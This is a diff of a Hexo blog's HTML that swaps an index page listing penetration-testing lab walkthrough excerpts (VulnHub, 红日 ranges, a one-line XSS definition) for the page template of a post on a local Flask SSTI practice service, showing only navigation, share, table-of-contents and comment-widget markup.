-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-    <article id="post-Hackathon2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/Hackathon2/" target="_blank">Hackathon2</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/Hackathon2/" class="archive-article-date">
-        <time datetime="2024-06-12T02:41:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-06-12</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<h3 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h3>
-	
-
-
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">--VulnHub靶场</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/Hackathon2/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-    <article id="post-Raven" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/Raven/" target="_blank">Raven</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/Raven/" class="archive-article-date">
-        <time datetime="2024-06-11T15:47:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-06-11</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<h3 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h3>
-	
-
-
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">--VulnHub靶场</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/Raven/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-    <article id="post-红日渗透靶场-红日2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/%E7%BA%A2%E6%97%A5%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-%E7%BA%A2%E6%97%A52/" target="_blank">红日渗透靶场-红日2</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/%E7%BA%A2%E6%97%A5%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-%E7%BA%A2%E6%97%A52/" class="archive-article-date">
-        <time datetime="2024-06-03T00:20:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-06-03</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<p>靶场下载链接：</p>
-	
-
-
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">--红日靶场</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/%E7%BA%A2%E6%97%A5%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-%E7%BA%A2%E6%97%A52/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-    <article id="post-红日渗透靶场-红日1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/%E7%BA%A2%E6%97%A5%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-%E7%BA%A2%E6%97%A51/" target="_blank">红日渗透靶场--红日1</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/%E7%BA%A2%E6%97%A5%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-%E7%BA%A2%E6%97%A51/" class="archive-article-date">
-        <time datetime="2024-06-01T04:54:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-06-01</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<p>靶场下载链接：</p>
-<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1r56G5IU9FoIC5pK-vWUrBQ">https://pan.baidu.com/s/1r56G5IU9FoIC5pK-vWUrBQ</a> </p>
-	
-
-
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">--红日靶场</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/%E7%BA%A2%E6%97%A5%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-%E7%BA%A2%E6%97%A51/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-    <article id="post-trollcave-v1-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/trollcave-v1-2/" target="_blank">trollcave-v1-2</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/trollcave-v1-2/" class="archive-article-date">
-        <time datetime="2024-05-27T15:31:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-05-27</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<h4 id="靶场：Trollcave-1-2"><a href="#靶场：Trollcave-1-2" class="headerlink" title="靶场：Trollcave:1.2"></a>靶场：Trollcave:1.2</h4><h4 id="1、收集信息"><a href="#1、收集信息" class="headerlink" title="1、收集信息"></a>1、收集信息</h4>
-	
-
-
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/trollcave-v1-2/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-    <article id="post-Os-hackNos-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/Os-hackNos-1/" target="_blank">Os-hackNos-1</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/Os-hackNos-1/" class="archive-article-date">
-        <time datetime="2024-05-26T14:59:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-05-26</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<h2 id="vulnhub靶机练习-Os-hackNos-1"><a href="#vulnhub靶机练习-Os-hackNos-1" class="headerlink" title="vulnhub靶机练习-Os-hackNos-1"></a>vulnhub靶机练习-Os-hackNos-1</h2><p>靶场下载链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">https://www.vulnhub.com/entry/hacknos-os-hacknos,401/</a></p>
-	
-
-
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/Os-hackNos-1/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-    <article id="post-XSS漏洞的挖掘与分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank">XSS漏洞的挖掘与分析</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/" class="archive-article-date">
-        <time datetime="2024-05-21T06:57:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-05-21</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<p>参考文章：<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/web/wq95oo">XSS&#x2F;CSRF</a></p>
-<h3 id="什么是XSS漏洞？"><a href="#什么是XSS漏洞？" class="headerlink" title="什么是XSS漏洞？"></a>什么是XSS漏洞？</h3><p>全称跨站脚本攻击，是web应用中的计算机安全漏洞，它允许恶意web用户将代码植入web网站里，给其它用户访问，当用户访问到有恶意代码的网站就会产生XSS攻击。</p>
-	
-
-
-
-    
-
     
 
   </div>
@@ -1182,7 +502,7 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SSTI</a>
         		</li>
       		
 		</ul>
@@ -1202,16 +522,76 @@
 
 
     
-    <p class="article-more-link">
-      <a class="article-more-a" href="/XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/">展开全文 >></a>
-    </p>
+
     
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://blog.zyp0422.mom/%E5%88%A9%E7%94%A8flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%B8%A6waf%EF%BC%89/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
 
     
     <div class="clearfix"></div>
   </div>
   </div>
 </article>
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/pwn-gdb-pwndbg%E5%92%8Cpwngdb%E8%81%94%E5%90%88%E4%BD%BF%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">pwn-gdb-pwndbg和pwngdb联合使用</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -1226,17 +606,42 @@
         </div>
         
         
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.</span> <span class="toc-text">flask搭建本地ssti服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85flask"><span class="toc-number">2.1.</span> <span class="toc-text">安装flask</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSTI%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">SSTI服务脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
     </div>
 </aside>
 
 
 
-  
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
-    </nav>
-  
+
+
+<div id="SOHUCS" sid="利用flask搭建本地ssti服务（带waf）" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "cyxqVIfAY",
+        conf: "3d1d672de8790c6875f19d013bc4ff6f"
+    });
+</script>
+</script>
+
+
+
+
+
+
+
 
 
           </div>
@@ -1276,8 +681,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
